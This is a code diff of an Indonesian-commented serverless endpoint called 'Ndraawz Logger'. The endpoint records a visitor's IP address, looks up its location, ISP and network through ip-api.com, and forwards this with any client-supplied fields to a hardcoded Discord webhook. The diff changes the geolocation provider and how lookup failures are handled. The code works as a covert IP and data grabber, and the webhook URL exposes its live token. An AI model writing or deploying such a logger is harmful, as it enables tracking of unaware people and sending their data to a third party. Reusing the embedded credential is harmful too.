@@ -1,34 +1,36 @@
 // api/log.js
 const https = require('https');
+const http = require('http');
 
 const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1452653310443257970/SkdnTLTdZUq5hJUf7POXHYcILxlYIVTS7TVc-NYKruBSlotTJtA2BzHY9bEACJxrlnd5";
 
-// Fungsi untuk ambil geolokasi dari IP (pakai multiple API)
+// Fungsi untuk ambil geolokasi dari IP menggunakan ip-api.com (HTTP)
 function getGeoInfo(ip) {
     return new Promise((resolve) => {
-        // API 1: ipwhois.io (HTTPS, gratis)
-        const url = `https://ipwhois.io/json/${ip}`;
+        // ip-api.com free endpoint (HTTP)
+        const url = `http://ip-api.com/json/${ip}?fields=status,country,regionName,city,isp,as,org,query`;
         
         const timeout = setTimeout(() => {
             console.log(`Timeout untuk IP: ${ip}`);
             resolve(null);
         }, 5000);
         
-        https.get(url, (geoRes) => {
+        // Gunakan http (bukan https) karena free endpoint ip-api.com hanya HTTP
+        http.get(url, (geoRes) => {
             let data = '';
             geoRes.on('data', chunk => data += chunk);
             geoRes.on('end', () => {
                 clearTimeout(timeout);
                 try {
                     const json = JSON.parse(data);
-                    if (json && json.success !== false && json.country) {
+                    if (json.status === 'success') {
                         console.log(`Geo success untuk ${ip}: ${json.country}`);
                         resolve({
                             country: json.country || "N/A",
-                            region: json.region || "N/A",
+                            region: json.regionName || "N/A",
                             city: json.city || "N/A",
                             isp: json.isp || "N/A",
-                            as: json.asn || "N/A",
+                            as: json.as || "N/A",
                             org: json.org || "N/A"
                         });
                     } else {
@@ -52,7 +54,7 @@ module.exports = async function handler(req, res) {
     res.setHeader('Access-Control-Allow-Origin', '*');
     
     if (req.method !== 'POST') {
-        return res.status(405).json({ error: 'Method Not Allow' });
+        return res.status(405).json({ error: 'Method Not Allowed' });
     }
 
     // Baca body
@@ -80,29 +82,27 @@ module.exports = async function handler(req, res) {
             console.log(`Geo error: ${e.message}`);
         }
         
-        // Jika geoData gagal, set default
-        if (!geoData) {
-            geoData = {
-                country: "Tidak diketahui",
-                region: "Tidak diketahui",
-                city: "Tidak diketahui",
-                isp: "Tidak diketahui",
-                as: "N/A",
-                org: "N/A"
-            };
-        }
-        
-        // Buat fields untuk embed
+        // Jika geoData gagal, kita tetap tampilkan IP saja
         const allFields = [
             ...(data.fields || []),
             { name: "━━━━━━━━━━━━━━ 🌐 IP INFORMATION ━━━━━━━━━━━━━━", value: "ㅤ", inline: false },
             { name: "📡 IP Address", value: cleanIp, inline: false },
-            { name: "🚩 Country", value: geoData.country, inline: false },
-            { name: "📍 Region", value: geoData.region, inline: false },
-            { name: "🏙️ City", value: geoData.city, inline: false },
-            { name: "🏢 ISP", value: geoData.isp, inline: false },
-            { name: "📡 AS / Org", value: `${geoData.as} / ${geoData.org}`, inline: false }
         ];
+        
+        // Tambahkan info geolokasi jika berhasil didapat
+        if (geoData) {
+            allFields.push(
+                { name: "🚩 Country", value: geoData.country, inline: false },
+                { name: "📍 Region", value: geoData.region, inline: false },
+                { name: "🏙️ City", value: geoData.city, inline: false },
+                { name: "🏢 ISP", value: geoData.isp, inline: false },
+                { name: "📡 AS / Org", value: `${geoData.as} / ${geoData.org}`, inline: false }
+            );
+        } else {
+            allFields.push(
+                { name: "⚠️ Info", value: "Geolokasi gagal diambil (mungkin rate limit atau koneksi)", inline: false }
+            );
+        }
         
         const embed = {
             title: "🚀 Ndraawz Logger",
@@ -122,12 +122,9 @@ module.exports = async function handler(req, res) {
         };
         
         const discordReq = https.request(options, (discordRes) => {
-            let discordBody = '';
-            discordRes.on('data', chunk => discordBody += chunk);
-            discordRes.on('end', () => {
-                console.log(`[LOG] Discord response: ${discordRes.statusCode}`);
-                res.status(200).json({ ok: true });
-            });
+            discordRes.resume();
+            console.log(`[LOG] Discord response: ${discordRes.statusCode}`);
+            res.status(200).json({ ok: true });
         });
         
         discordReq.on('error', (err) => {
